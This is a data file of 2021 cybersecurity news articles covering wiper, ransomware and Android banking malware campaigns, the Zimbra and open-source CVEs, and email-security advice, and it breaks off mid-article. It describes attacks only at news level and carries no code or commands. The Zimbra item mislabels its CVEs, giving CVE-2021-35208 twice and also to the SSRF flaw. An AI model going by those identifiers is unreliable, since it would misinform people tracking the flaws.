'text': 'A cyber attack that derailed websites of Iran’s transport ministry and its national railway system earlier this month, causing widespread disruptions in train services, was the result of a never-before-seen reusable wiper malware called “Meteor.“\nThe campaign — dubbed “MeteorExpress“ — has not been linked to any previously identified threat group or to additional attacks, making it the first incident involving the deployment of this malware, according to researchers from Iranian antivirus firm Amn Pardaz and SentinelOne. Meteor is believed to have been in the works over the past three years.\n“Despite a lack of specific indicators of compromise, we were able to recover most of the attack components,“ SentinelOne’s Principal Threat Researcher, Juan Andres Guerrero-Saade, noted. “Behind this outlandish tale of stopped trains and glib trolls, we found the fingerprints of an unfamiliar attacker,“ adding the offensive is “designed to cripple the victim’s systems, leaving no recourse to simple remediation via domain administration or recovery of shadow copies.“\n\nOn July 9, the Iranian train system was left paralyzed in the wake of a major attack, with the hackers defacing electronic displays to instruct passengers to direct their complaints to the phone number of the Iranian Supreme Leader Ayatollah Ali Khamenei’s office. The incident is said to have reportedly caused “unprecedented chaos“ at stations with hundreds of trains delayed or canceled.\nNow according to SentinelOne, the infection chain commenced with the abuse of Group Policy to deploy a toolkit that consisted of a combination of batch files orchestrating different components, which are extracted from multiple RAR archives and are chained together to facilitate the encryption of the filesystem, corruption of the master boot record (MBR), and locking of the system in question.\n\nOther batch script files dropped during the attack were found to take charge of disconnecting the infected device from the network and creating Windows Defender exclusions for all of the components, a tactic that’s becoming increasingly prevalent among threat actors to hide their malicious activities from antimalware solutions installed on the machine.\n\nMeteor, for its part, is an externally configurable wiper with an extensive set of features, including the ability to delete shadow copies as well as a “wealth of additional functionality“ such as changing user passwords, terminating arbitrary processes, disabling recovery mode, and executing malicious commands.\nThe wiper has been characterized as “a bizarre amalgam of custom code“ that blends open-source components with ancient software that’s “rife with sanity checks, error checking, and redundancy in accomplishing its goals,“ suggesting a fragmented approach and a lack of coordination across different teams involved in the development.\n“Conflict in cyberspace is overpopulated with increasingly brazen threat actors. Behind the artistry of this epic troll lies an uncomfortable reality where a previously unknown threat actor is willing to leverage wiper malware against public railways systems,“ Guerrero-Saade said. “The attacker is an intermediate level player whose different operational components sharply oscillate from clunky and rudimentary to slick and well-developed.“\n“We should keep in mind that the attackers were already familiar with the general setup of their target, features of the domain controller, and the target’s choice of backup system (Veeam). That implies a reconnaissance phase that flew entirely under the radar and a wealth of espionage tooling that we’ve yet to uncover.“\n\n\nFound this article interesting?

'text': 'An ongoing malicious campaign that employs phony call centers has been found to trick victims into downloading malware capable of data exfiltration as well as deploying ransomware on infected systems.\nThe attacks — dubbed “BazaCall“ — eschew traditional social engineering techniques that rely on rogue URLs and malware-laced documents in favor of a vishing-like method wherein targeted users are sent email messages informing them of a forthcoming subscription charge unless they call a specific phone number.\nBy tricking the recipients into calling the number, the unsuspecting victims are connected with an actual human operator at a fraudulent call center, who then provides them with instructions to download the BazaLoader malware.\n\nBazaLoader (aka BazarBackdoor) is a C++-based downloader with the ability to install various types of malicious programs on infected computers, including deploying ransomware and other malware to steal sensitive data from victimized systems. First observed in April 2020, BazaLoader campaigns have been used by multiple threat actors and frequently serves as a loader for disruptive malware such as Ryuk and Conti ransomware.\nBazaCall Attack Flow\n“Attacks emanating from the BazaCall threat could move quickly within a network, conduct extensive data exfiltration and credential theft, and distribute ransomware within 48 hours of the initial compromise,“ Microsoft 365 Defender Threat Intelligence Team said in a report published Thursday.\n\nBecause the malware isn’t distributed via a link or document within the message body itself, the lures add a level of difficulty that enables attackers to evade phishing and malware detection software. This campaign is part of a broader trend in which BazaLoader-affiliated criminals use call centers — the operators seemingly non-native English speakers — as part of an intricate attack chain.\nPost-Compromise Activities\nEarlier this May, Palo Alto Networks and Proofpoint revealed an elaborate infection mechanism that leveraged websites associated with fake ebooks (World Books) and movie streaming subscription services (BravoMovies) as a stepping stone to deliver rigged Excel spreadsheets containing the BazaLoader malware. The latest attack disclosed by Microsoft is no different in that the call center agent serves as a conduit, urging the caller to navigate to a recipe website (“topcooks[.]us“) in order to cancel the non-existent trial subscription.\n“The use of another human element in BazaCall’s attack chain through the above mentioned hands-on-keyboard control further makes this threat more dangerous and more evasive than traditional, automated malware attacks,“ the researchers said. “BazaCall campaigns highlight the importance of cross-domain optics and the ability to correlate events in building a comprehensive defense against complex threats.“\n\n\nFound this article interesting?

{'title': 'Hackers Exploit Microsoft Browser Bug to Deploy VBA Malware on Targeted PCs',
'text': 'An unidentified threat actor has been exploiting a now-patched zero-day flaw in Internet Explorer browser to deliver a fully-featured VBA-based remote access trojan (RAT) capable of accessing files stored in compromised Windows systems, and downloading and executing malicious payloads as part of an “unusual“ campaign.\nThe backdoor is distributed via a decoy document named “Manifest.docx“ that loads the exploit code for the vulnerability from an embedded template, which, in turn, executes shellcode to deploy the RAT, according to cybersecurity firm Malwarebytes, which spotted the suspicious Word file on July 21, 2021. The malware-laced document claims to be a “Manifesto of the inhabitants of Crimea“ calling on the citizens to oppose Russian President Vladimir Putin and “create a unified platform called ’People’s Resistance.’“\n\nThe Internet Explorer flaw, tracked as CVE-2021-26411, is notable for the fact that it was abused by the North Korea-backed Lazarus Group to target security researchers working on vulnerability research and development.\nEarlier this February, South Korean cybersecurity firm ENKI revealed the state-aligned hacking collective had made an unsuccessful attempt at targeting its security researchers with malicious MHTML files that, when opened, downloaded two payloads from a remote server, one of which contained a zero-day against Internet Explorer. Microsoft addressed the issue as part of its Patch Tuesday updates for March.\n\nThe Internet Explorer exploit is one of the two ways that’s used to deploy the RAT, with the other method relying on a social engineering component that involves downloading and executing a remote macro-weaponized template containing the implant. Regardless of the infection chain, the use of double attack vectors is likely an attempt to increase the likelihood of finding a path into the targeted machines.\n“While both techniques rely on template injection to drop a full-featured remote access trojan, the IE exploit (CVE-2021-26411) previously used by the Lazarus APT is an unusual discovery,“ Malwarebytes researcher Hossein Jazi said in a report shared with The Hacker News. “The attackers may have wanted to combine social engineering and exploit to maximize their chances of infecting targets.“\n\nBesides collecting system metadata, the VBA RAT is orchestrated to identify antivirus products running on the infected host and execute commands it receives from an attacker-controlled server, including reading, deleting, and downloading arbitrary files, and exfiltrate the results of those commands back to the server.\nAlso discovered by Malwarebytes is a PHP-based panel nicknamed “Ekipa“ that’s used by the adversary to track victims and view information about the modus operandi that led to the successful breach, highlighting successful exploitation using the IE zero-day and the execution of the RAT.\n“As the conflict between Russia and Ukraine over Crimea continues, cyber attacks have been increasing as well,“ Jazi said. “The decoy document contains a manifesto that shows a possible motive (Crimea) and target (Russian and pro-Russian individuals) behind this attack. However, it could also have been used as a false flag.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': 'New Ransomware Gangs — Haron and BlackMatter — Emerge on Cybercrime Forums',
'text': 'Two new ransomware-as-service (RaaS) programs have appeared on the threat radar this month, with one group professing to be a successor to DarkSide and REvil, the two infamous ransomware syndicates that went off the grid following major attacks on Colonial Pipeline and Kaseya over the past few months.\n“The project has incorporated in itself the best features of DarkSide, REvil, and LockBit,“ the operators behind the new BlackMatter group said in their darknet public blog, making promises to not strike organizations in several industries, including healthcare, critical infrastructure, oil and gas, defense, non-profit, and government sectors.\n\nAccording to Flashpoint, the BlackMatter threat actor registered an account on Russian-language forums XSS and Exploit on July 19, quickly following it up with a post stating they are looking to purchase access to infected corporate networks comprising anywhere between 500 and 15,000 hosts in the U.S., Canada, Australia, and the U.K. and with revenues of over $100 million a year, potentially hinting at a large-scale ransomware operation.\n“The actor deposited 4BTC (approximately $150,000 USD) into their escrow account. Large deposits on the forum indicate the seriousness of the threat actor,“ Flashpoint researchers said in a report. “BlackMatter does not openly state that they are a ransomware collective operator, which technically doesn’t break the rules of the forums, though the language of their post, as well as their goals clearly indicate that they are a ransomware collective operator.“\n\nOn July 27, the group is said to have begun actively recruiting partners and affiliates using Exploit forum’s Jabber server to promulgate their recruitment message, in which they claim to be looking for experienced penetration testers knowledgeable in Windows and Linux systems as well as initial access suppliers, who would either sell their access or work for a percentage of the profits.\nLast month, enterprise security firm Proofpoint disclosed how ransomware gangs are increasingly buying access from independent cybercriminal groups who infiltrate major targets and then supply them with an entry point to deploy data theft and encryption operations in exchange for a slice of the ill-gotten gains.\n\nThe emergence of BlackMatter coincides with the demise of DarkSide and REvil in the wake of highly publicized ransomware incidents of Colonial Pipeline, JBS, and Kaseya, raising speculations that the groups may eventually rebrand and resurface under a new identity.\nWhile concrete evidence connecting BlackMatter and the now-defunct groups is scant, the “similar rules around targeting“ and the fact that REvil previously labeled their Windows Registry key “BlackLivesMatter“ lend credence to theories that REvil may have indeed taken a temporary hiatus and gone underground after a wave of high-profile attacks.\n“It is possible that copycats are intentionally mimicking the behavior of REvil to gain immediate credibility for allegedly being the reincarnation of REvil,“ Flashpoint said.\nBlackMatter is not the only newcomer, however. South Korean security firm S2W Labs last week took the wraps off Haron, another latest entrant to the cybercrime ecosystem that made its appearance this month and heavily borrows from past ransomware variants such as Thanos and the now-discontinued Avaddon.\n\n\nFound this article interesting?

{'title': 'Best Practices to Thwart Business Email Compromise (BEC) Attacks',
'text': 'Business email compromise (BEC) refers to all types of email attacks that do not have payloads. Although there are numerous types, there are essentially two main mechanisms through which attackers penetrate organizations utilizing BEC techniques, spoofing and account take-over attacks.\nIn a recent study, 71% of organizations acknowledged they had seen a business email compromise (BEC) attack during the past year. Forty-three percent of organizations experienced a security incident in the last 12 months, with 35% stating that BEC/phishing attacks account for more than 50% of the incidents.\nThe FBI’s Internet Crime Complaint Center (IC3) reports that BEC scams were the most expensive of cyberattacks in 2020, with 19,369 complaints and adjusted losses of approximately $1.8 billion. Recent BEC attacks include spoofing attacks on Shark Tank Host Barbara Corcoran, who lost $380,000; the Puerto Rican government attacks that amounted to $4 million, and Japanese media giant, Nikkei, who transferred $29 million based on instructions in a fraudulent email.\nTo thwart a BEC attack, an organization must focus on the Golden Triangle: the alignment of people, process, and technology. Read on to discover best practices every organization should follow to mitigate BEC attacks.\nProcess\nThe finance department in every organization has an expenditure authorization policy in place. This policy establishes clear approval levels for any expenditures/payments to safeguard the company’s assets.\nWhile all expenditures/payments should be part of an approved budget, this policy provides a tool for the finance department to ensure that each payment is authorized by the right individual or individuals based on the amount.\nIn some cases, the CEO or president of a company is granted unlimited authority when it comes to requesting payments. Cybercriminals realize this, which is why they spoof the email accounts of high-level individuals.\nGiven the current cybersecurity landscape, the finance department should re-evaluate this policy to put stricter processes in place. This may mean requiring multiple authorizations for major expenditures paid via check, wire transfer, or any other channel to ensure the payment request is legitimate. It may also spell out how electronic authorizations are obtained.\nFor example, if someone in the finance department receives an email from the CEO requesting a wire transfer, the administrator processing the request is required to follow the company policy to obtain additional approvals, including sending emails to a pre-approved distribution list to gain electronic approvals along with confirmations via phone. The expenditure amounts dictate who can sign and co-sign and would be based on your organization’s risk appetite, that is, how much your company is willing to lose.\nAs a member of the IT team, you should speak with the finance department to explain how BEC and other spoofing attacks happen. Provide real-life examples of recent BEC attacks and brainstorm what your company would do differently to thwart the attack. Based on these examples, the finance department should re-evaluate the current policy with cybersecurity spoofing and BEC in mind. This may mean that the Chairman of the Board, CEO, or company president cannot be the only signature on major expenditures, the dollar amount based, again, on your company’s risk appetite.\nNow that the process is established within the expenditure authorization policy, the company now must ensure that its people are trained to follow the policy, without exception.\nPeople\nAll company employees must be trained to know what a cybersecurity attack looks like, what to do, what not to do, and this training should be delivered on an ongoing basis since the cybersecurity landscape is changing so rapidly.\nEmployees in the finance department – or anyone who is authorized to disburse funds in any form – should be trained on what BEC and other spoofing attacks look like. \nEmphasize that many of these attacks take the form of emails from high-level executives, they tend to be “urgent“ requests, and sometimes the request is sent minutes before the close of business and requires immediate payment. With this training, plus the requirement that all employees follow the expenditure authorization policy, your company should be able to stop BEC attacks.\nMany companies purchase insurance to cover these BEC losses, but no organization can be certain that the carrier will pay. For example, trading firm Virtu Financial Inc. lost $6.9 million in a BEC scam but their insurer, Axis Insurance, has refused to pay claiming “the unauthorized access into Virtu’s computer system was not the direct cause of the loss, but rather, the loss was caused by separate and intervening acts by employees of Virtu who issued the wire transfers because they believed the ’spoofed’ email asking for the funds to be transferred to be true.“ Virtu Financial Inc. has filed a complaint against Axis Insurance for allegedly breaching the contract by refusing to provide coverage for the cyberattack.\nTechnology\nNext-generation, advanced cybersecurity technology can help block any email threat, including spam, phishing, BEC and follow-on attacks, advanced persistent threats (APTs), and zero-day that attack vulnerabilities – all before the threat reaches end-users. \nThese types of solutions include:\nAn anti-spam engine that blocks malicious communications with anti-spam and reputation-based filters.An anti-phishing engine to detect malicious URLs and prevent any type of phishing attack before it reaches end-users.An anti-spoofing engine to prevent payload-less attacks such as spoofing, look-alike domains, and display name deception.Anti-evasion technologies that detect malicious hidden content by recursively unpacking the content into smaller units (files and URLs) which are then dynamically checked by multiple engines in seconds.Machine intelligence (MI) and natural language processing (NLP) to check for aberrations from the norm in content and context, such as identifying an abnormal writing style, key words that may signify malicious activity, strange IP addresses, geo locations, timing, etc.Detection to prevent advanced threats and zero-day attacks.Ad-hoc email analysis for end-users to identify suspicious emails before taking reckless action.End-user contextual help to flag emails with customizable banners based on policies and rules to provide end-users with additional contextual information and increase their security awareness.\nThe solution should be able to detect and stop spoofing and account take-over attacks, where a cybercriminal gets access to a legitimate email account and tries to go further into the network.\nFinal Thoughts\nThe proficiency of these attacks is why businesses and managed service providers (MSPs) choose to use Acronis Cyber Protection solutions. With a unique combination of machine intelligence (MI), automation, and integration, this all-in-one cyber protection solution is designed to help lower business risk and improve productivity, regardless of how data loss occurs. \n\n\nFound this article interesting?

{'title': 'New Android Malware Uses VNC to Spy and Steal Passwords from Victims',
'text': 'A previously undocumented Android-based remote access trojan (RAT) has been found to use screen recording features to steal sensitive information on the device, including banking credentials, and open the door for on-device fraud.\nDubbed “Vultur“ due to its use of Virtual Network Computing (VNC)’s remote screen-sharing technology to gain full visibility on targeted users, the mobile malware was distributed via the official Google Play Store and masqueraded as an app named “Protection Guard,“ attracting over 5,000 installations. Banking and crypto-wallet apps from entities located in Italy, Australia, and Spain were the primary targets.\n“For the first time we are seeing an Android banking trojan that has screen recording and keylogging as the main strategy to harvest login credentials in an automated and scalable way,“ researchers from ThreatFabric said in a write-up shared with The Hacker News.\n\n“The actors chose to steer away from the common HTML overlay development we usually see in other Android banking Trojans: this approach usually requires a larger time and effort investment from the actors to create multiple overlays capable of tricking the user. Instead, they chose to simply record what is shown on the screen, effectively obtaining the same end result.“\nWhile banking malware such as MysteryBot, Grandoreiro, Banker.BR, and Vizom have traditionally relied on overlay attacks — i.e., creating a false version of the bank’s login page and overlaying it on top of the legitimate app — to trick victims into revealing their passwords and other important private information, evidence is mounting that threat actors are pivoting away from this approach.\n\nIn a report published earlier this week, Italian cybersecurity firm Cleafy uncovered UBEL, an updated variant of Oscorp, that was observed using WebRTC to interact with the compromised Android phone in real-time. Vultur adopts a similar tactic in that it takes advantage of accessibility permissions to capture keystrokes and leverages VNC’s screen recording feature to stealthily log all activities on the phone, thus obviating the need to register a new device and making it difficult for banks to detect fraud.\nWhat’s more, the malware employs ngrok, a cross-platform utility used to expose local servers behind NATs and firewalls to the public internet over secure tunnels, to provide remote access to the VNC server running locally on the phone. Additionally, it also establishes connections with a command-and-control (C2) server to receive commands over Firebase Cloud Messaging (FCM), the results of which, including extracted data and screen captures, are then transmitted back to the server.\n\nThreatFabric’s investigation also connected Vultur with another well-known piece of malicious software named Brunhilda, a dropper that utilizes the Play Store to distribute different kinds of malware in what’s called a “dropper-as-a-service“ (DaaS) operation, citing overlaps in the source code and C2 infrastructure used to facilitate attacks.\nThese ties, the Amsterdam-based cybersecurity services company said, indicate Brunhilda to be a privately operating threat actor that has its own dropper and proprietary RAT Vultur.\n“The story of Vultur shows one more time how actors shift from using rented Trojans (MaaS) that are sold on underground markets towards proprietary/private malware tailored to the needs of this group,“ the researchers concluded. “These attacks are scalable and automated since the actions to perform fraud can be scripted on the malware backend and sent in the form of commands sequence, making it easy for the actor(s) to hit-and-run.“\n\n\nFound this article interesting?

'text': 'An Android malware that was observed abusing accessibility services in the device to hijack user credentials from European banking applications has morphed into an entirely new botnet as part of a renewed campaign that began in May 2021.\nItaly’s CERT-AGID, in late January, disclosed details about Oscorp, a mobile malware developed to attack multiple financial targets with the goal of stealing funds from unsuspecting victims. Its features include the ability to intercept SMS messages and make phone calls, and carry out overlay attacks for more than 150 mobile applications by making use of lookalike login screens to siphon valuable data.\n\nThe malware was distributed through malicious SMS messages, with the attacks often conducted in real-time by posing as bank operators to dupe targets over the phone and surreptitiously gain access to the infected device via WebRTC protocol and ultimately conduct unauthorized bank transfers. While no new activities were reported since then, it appears that Oscorp may have staged a return after a temporary hiatus in the form of an Android botnet known as UBEL.\n\n“By analyzing some related samples, we found multiple indicators linking Oscorp and UBEL to the same malicious codebase, suggesting a fork of the same original project or just a rebrand by other affiliates, as its source-code appears to be shared between multiple [threat actors],“ Italian cybersecurity company Cleafy said Tuesday, charting the malware’s evolution.\n\nAdvertised on underground forums for $980, UBEL, like its predecessor, requests for intrusive permissions that allows it to read and send SMS messages, record audio, install and delete applications, launch itself automatically after system boot, and abuse accessibility services on Android to amass sensitive information from the device such as login credentials and two-factor authentication codes, the results of which are exfiltrated back to a remote server.\nOnce downloaded on the device, the malware attempts to install itself as a service and hide its presence from the target, thereby achieving persistence for extended periods of time.\n\nInterestingly, the use of WebRTC to interact with the compromised Android phone in real-time circumvents the need to enroll a new device and take over an account to perform fraudulent activities.\n“The main goal for this [threat actor] by using this feature, is to avoid a ’new device enrollment’, thus drastically reducing the possibility of being flagged ’as suspicious’ since device’s fingerprinting indicators are well-known from the bank’s perspective,“ the researchers said.\nThe geographical distribution of banks and other apps targeted by Oscorp consists of Spain, Poland, Germany, Turkey, the U.S., Italy, Japan, Australia, France, and India, among others, according to the report.\n\n\nFound this article interesting?

'text': 'A Chinese cyberespionage group known for targeting Southeast Asia leveraged flaws in the Microsoft Exchange Server that came to light earlier this March to deploy a previously undocumented variant of a remote access trojan (RAT) on compromised systems.\nAttributing the intrusions to a threat actor named PKPLUG (aka Mustang Panda and HoneyMyte), Palo Alto Networks’ Unit 42 threat intelligence team said it identified a new version of the modular PlugX malware, called THOR, that was delivered as a post-exploitation tool to one of the breached servers.\nDating back to as early as 2008, PlugX is a fully-featured second-stage implant with capabilities such as file upload, download, and modification, keystroke logging, webcam control, and access to a remote command shell.\n\n“The variant observed [...] is unique in that it contains a change to its core source code: the replacement of its trademark word ’PLUG’ to ’THOR,’“ Unit 42 researchers Mike Harbison and Alex Hinchliffe noted in a technical write-up published Tuesday.\n“The earliest THOR sample uncovered was from August 2019, and it is the earliest known instance of the rebranded code. New features were observed in this variant, including enhanced payload-delivery mechanisms and abuse of trusted binaries.“\n\nAfter Microsoft disclosed on March 2 that China-based hackers — codenamed Hafnium — were exploiting zero-day bugs in Exchange server collectively known as ProxyLogon to steal sensitive data from select targets, multiple threat actors, such as ransomware groups (DearCry and Black Kingdom) and crypto-mining gangs (LemonDuck), were also observed exploiting the flaws to hijack Exchange servers and install a web shell that granted code execution at the highest privilege level.\nPKPLUG now joins the list, according to Unit 42 researchers, who found the attackers bypassing antivirus detection mechanisms to target Microsoft Exchange servers by leveraging legitimate executables such as BITSAdmin to retrieve a seemingly innocuous file (“Aro.dat“) from an actor-controlled GitHub repository. \n\nThe file, which houses the encrypted and compressed PlugX payload, alludes to a freely available advanced repair and optimization tool that’s designed to clean up and fix issues in the Windows Registry. \nThe latest sample of PlugX comes equipped with a variety of plug-ins that “provide attackers various capabilities to monitor, update and interact with the compromised system to fulfil their objectives,“ the researchers said. THOR’s links to PKPLUG stem from piecing together the command-and-control infrastructure as well as overlaps in the malicious behaviors detected among other recently discovered PlugX artifacts.\nAdditional indicators of compromise associated with the attack can be accessed here. Unit 42 has also made available a Python script that can decrypt and unpack encrypted PlugX payloads without having the associated PlugX loaders.\n\n\nFound this article interesting?

'text': 'An Iranian cyberespionage group masqueraded as an aerobics instructor on Facebook in an attempt to infect the machine of an employee of an aerospace defense contractor with malware as part of a years-long social engineering and targeted malware campaign.\nEnterprise security firm Proofpoint attributed the covert operation to a state-aligned threat actor it tracks as TA456, and by the wider cybersecurity community under the monikers Tortoiseshell and Imperial Kitten.\n\n“Using the social media persona ’Marcella Flores,’ TA456 built a relationship across corporate and personal communication platforms with an employee of a small subsidiary of an aerospace defense contractor,“ Proofpoint said in a report shared with The Hacker News. “In early June 2021, the threat actor attempted to capitalize on this relationship by sending the target malware via an ongoing email communication chain.“\n\nEarlier this month, Facebook revealed it took steps to dismantle a “sophisticated“ cyber-espionage campaign undertaken by Tortoiseshell hackers targeting about 200 military personnel and companies in the defense and aerospace sectors in the U.S., U.K., and Europe using an extensive network of fake online personas on its platform. The threat actor is believed to be loosely aligned with the Islamic Revolutionary Guard Corps (IRGC) via its association with the Iranian IT company Mahak Rayan Afraz (MRA).\n\nNow according to Proofpoint, one such elaborate fake persona created by the TA456 threat actor involved in back-and-forth exchanges with the unnamed aerospace employee dating as far back as 2019, before culminating the delivery of a malware called LEMPO that’s engineered to designed to establish persistence, perform reconnaissance, and exfiltrate sensitive information. The infection chain was triggered via an email message containing a OneDrive URL that claimed to be a diet survey — a macro-embedded Excel document — only to stealthily retrieve the reconnaissance tool by connecting to an attacker-controlled domain. Facebook has since suspended the Flores account from its platform in a coordinated takedown of users linked to Iranian hacker activity.\n\n“TA456 demonstrated a significant operational investment by cultivating a relationship with a target’s employee over years in order to deploy LEMPO to conduct reconnaissance into a highly secured target environment within the defense industrial base,“ Proofpoint researchers said. “This campaign exemplifies the persistent nature of certain state aligned threats and the human engagement they are willing to conduct in support of espionage operations.“\n\n\nFound this article interesting?

{'title': 'New Bug Could Let Attackers Hijack Zimbra Server by Sending Malicious Email',
'text': 'Cybersecurity researchers have discovered multiple security vulnerabilities in Zimbra email collaboration software that could be potentially exploited to compromise email accounts by sending a malicious message and even achieve a full takeover of the mail server when hosted on a cloud infrastructure.\nThe flaws — tracked as CVE-2021-35208 and CVE-2021-35208 — were discovered and reported in Zimbra 8.8.15 by researchers from code quality and security solutions provider SonarSource in May 2021. Mitigations have since been released in Zimbra versions 8.8.15 Patch 23 and 9.0.0 Patch 16.\nCVE-2021-35208 (CVSS score: 5.4) - Stored XSS Vulnerability in ZmMailMsgView.javaCVE-2021-35209 (CVSS score: 6.1) - Proxy Servlet Open Redirect Vulnerability\n“A combination of these vulnerabilities could enable an unauthenticated attacker to compromise a complete Zimbra webmail server of a targeted organization,“ said SonarSource vulnerability researcher, Simon Scannell, who identified the security weaknesses. “As a result, an attacker would gain unrestricted access to all sent and received emails of all employees.“\n\nZimbra is a cloud-based email, calendar, and collaboration suite for enterprises and is available both as an open-source version and a commercially supported version with additional features such as a proprietary connector API to synchronize mail, calendar, and contacts to Microsoft Outlook, among others. It’s used by over 200,000 businesses across 160 countries.\nCVE-2021-35208 concerns a cross-site scripting (XSS) vulnerability in the Calendar Invite component that can be triggered in a victim’s browser upon viewing a specially-crafted email message containing a JavaScript payload that, when executed, grants access to the target’s entire inbox as well as the web client session, which can then be abused to launch further attacks.\n\nThe problem stems from the fact that the Zimbra web clients — an Ajax-based desktop client, a static HTML client, and a mobile-optimized client — perform the sanitization of the HTML content of incoming emails on the server-side and in a manner that enables a bad actor to inject rogue JavaScript code.\n“The downside of using server-side sanitization is that all three clients may transform the trusted HTML of an email afterwards to display it in their unique way,“ Scannell said. “Transformation of already sanitized HTML inputs can lead to corruption of the HTML and then to XSS attacks.“\n\nOn the other hand, CVE-2021-35208 relates to a server side request forgery (SSRF) attack wherein an authenticated member of an organization can chain the flaw with the aforementioned XSS issue to redirect the HTTP client used by Zimbra to an arbitrary URL and extract sensitive information from the cloud, including Google Cloud API access tokens and IAM credentials from AWS, leading to its compromise.\n“Zimbra would like to alert its customers that it is possible for them to introduce an SSRF security vulnerability in the Proxy Servlet,“ the company noted in its advisory. “If this servlet is configured to allow a particular domain (via zimbraProxyAllowedDomains configuration setting), and that domain resolves to an internal IP address (such as 127.0.0.1), an attacker could possibly access services running on a different port on the same server, which would normally not be exposed publicly.“\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Tuesday disclosed nine security vulnerabilities affecting three open-source projects — EspoCRM, Pimcore, and Akaunting — that are widely used by several small to medium businesses and, if successfully exploited, could provide a pathway to more sophisticated attacks.\nAll the security flaws in question, which impact EspoCRM v6.1.6, Pimcore Customer Data Framework v3.0.0, Pimcore AdminBundle v6.8.0, and Akaunting v2.1.12, were fixed within a day of responsible disclosure, researchers Wiktor Sędkowski of Nokia and Trevor Christiansen of Rapid7 noted. Six of the nine flaws were uncovered in the Akaunting project.\n\nEspoCRM is an open-source customer relationship management (CRM) application, while Pimcore is an open-source enterprise software platform for customer data management, digital asset management, content management, and digital commerce. Akaunting, on the other hand, is an open-source and online accounting software designed for invoice and expense tracking.\nThe list of issues is as follows -\nCVE-2021-3539 (CVSS score: 6.3) - Persistent XSS flaw in EspoCRM v6.1.6CVE-2021-31867 (CVSS score: 6.5) - SQL injection in Pimcore Customer Data Framework v3.0.0CVE-2021-31869 (CVSS score: 6.5) - SQL injection in Pimcore AdminBundle v6.8.0CVE-2021-36800 (CVSS score: 8.7) - OS command injection in Akaunting v2.1.12CVE-2021-36801 (CVSS score: 8.5) - Authentication bypass in Akaunting v2.1.12CVE-2021-36802 (CVSS score: 6.5) - Denial-of-service via user-controlled ’locale’ variable in Akaunting v2.1.12CVE-2021-36803 (CVSS score: 6.3) - Persistent XSS during avatar upload in Akaunting v2.1.12CVE-2021-36804 (CVSS score: 5.4) - Weak Password Reset in Akaunting v2.1.12CVE-2021-36805 (CVSS score: 5.2) - Invoice footer persistent XSS in Akaunting v2.1.12\nSuccessful exploitation of the flaws could enable an authenticated adversary to execute arbitrary JavaScript code, commandeer the underlying operating system and use it as a beachhead to launch additional nefarious attacks, trigger a denial-of-service via a specially-crafted HTTP request, and even change the company associated with a user account sans any authorization.\nEspoCRM\nPimcore Customer Data Framework\nAlso addressed in Akaunting is a weak password reset vulnerability where the attacker can abuse the “I forgot my password“ functionality to send a phishing email from the application to a registered user containing a malicious link that, when clicked, delivers the password reset token. The bad actor can then use the token to set a password of their choice.\n\n“All three of these projects have real users, real customers of their attendant support services and cloud-hosted versions, and are undoubtedly the core applications supporting thousands of small to medium businesses running today,“ the researchers noted.\n“For all of these issues, updating to the latest versions of the affected applications will resolve them. If updating is difficult or impossible due to external factors or custom, local changes, users of these applications can limit their exposure by not presenting their production instances to the internet directly — instead, expose them only to trusted internal networks with trusted insiders.“\n\n\nFound this article interesting?

{'title': 'Hackers Turning to ’Exotic’ Programming Languages for Malware Development',
'text': 'Threat actors are increasingly shifting to “exotic“ programming languages such as Go, Rust, Nim, and Dlang that can better circumvent conventional security protections, evade analysis, and hamper reverse engineering efforts.\n“Malware authors are known for their ability to adapt and modify their skills and behaviors to take advantage of newer technologies,“ said Eric Milam, Vice President of threat research at BlackBerry. “That tactic has multiple benefits from the development cycle and inherent lack of coverage from protective products.“\nOn the one hand, languages like Rust are more secure as they offer guarantees like memory-safe programming, but they can also be a double-edged sword when malware engineers abuse the same features designed to offer increased safeguards to their advantage, thereby making malware less susceptible to exploitation and thwart attempts to activate a kill-switch and render them powerless.\n\nNoting that binaries written in these languages can appear more complex, convoluted, and tedious when disassembled, the researchers said the pivot adds additional layers of obfuscation, simply by virtue of them being relatively new, leading to a scenario where older malware developed using traditional languages like C++ and C# are being actively retooled with droppers and loaders written in uncommon alternatives to evade detection by endpoint security systems.\nEarlier this year, enterprise security firm Proofpoint discovered new malware written in Nim (NimzaLoader) and Rust (RustyBuer) that it said were being used in active campaigns to distribute and deploy Cobalt Strike and ransomware strains via social engineering campaigns. In a similar vein, CrowdStrike last month observed a ransomware sample that borrowed implementations from previous HelloKitty and FiveHands variants, while using a Golang packer to encrypt its main C++-based payload.\nIndeed, according to a report published by Israeli cybersecurity company Intezer in February 2021, malware written in Go has witnessed a steady climb, jumping nearly 2,000% since 2017, as both nation state-backed and non-nation state threat actors adopt the language into their toolset.\n\nBlackBerry’s latest findings show that these artifacts are part of an uptick in threat actors adopting Dlang, Go, Nim, and Rust to rewrite existing families or create tools for new malware sets over the past decade -\nDlang - DShell, Vovalex, OutCrypt, RemcosRATGo - ElectroRAT, EKANS (aka Snake), Zebrocy, WellMess, ChaChiNim - NimzaLoader, Zebrocy, DeroHE, Nim-based Cobalt Strike loadersRust - Convuster Adware, RustyBuer, TeleBots Downloader and Backdoor, NanoCore Dropper, PyOxidizer\n“Programs written using the same malicious techniques but in a new language are not usually detected at the same rate as those written in a more mature language,“ BlackBerry researchers concluded.\n“The loaders, droppers and wrappers [...] are in many cases simply altering the first stage of the infection process rather than changing the core components of the campaign. This is the latest in threat actors moving the line just outside of the range of security software in a way that might not trigger on later stages of the original campaign.“\n\n\nFound this article interesting?

{'title': 'BIMI: A Visual Take on Email Authentication and Security',
'text': 'There is a saying that goes something like, “Do not judge a book by its cover.“ Yet, we all know we can not help but do just that - especially when it comes to online security.\nLogos play a significant role in whether or not we open an email and how we assess the importance of each message. Brand Indicators for Message Identification, or BIMI, aims to make it easier for us to quickly identify important information within emails using branding guidelines and visual cues found in logos. \nIn recent years, users are often unsure about the authenticity of emails, and this has become a major issue for businesses fighting spam. BIMI gives email users access to information about a brand’s identity. A company has complete control and freedom over what logo to attach to authenticated emails. Overall, BIMI acts as an additional layer of security to the existing email authentication process.\nWhat is BIMI, and how does it strengthen the security of your emails? \nBIMI is a standard that allows organizations to display their unique brand logos alongside DMARC-compliant emails by changing certain DNS records. BIMI centralizes logo display by allowing domain owners to use a single, standardized image. Eliminating the need for proprietary systems for logo display and management also eliminates the frustration of brand proliferation. It improves the user experience across the email inbox. \nBefore you set out to set up your BIMI record, there are a few important requirements you should consider. These are as follows: \nBefore implementing BIMI, make sure 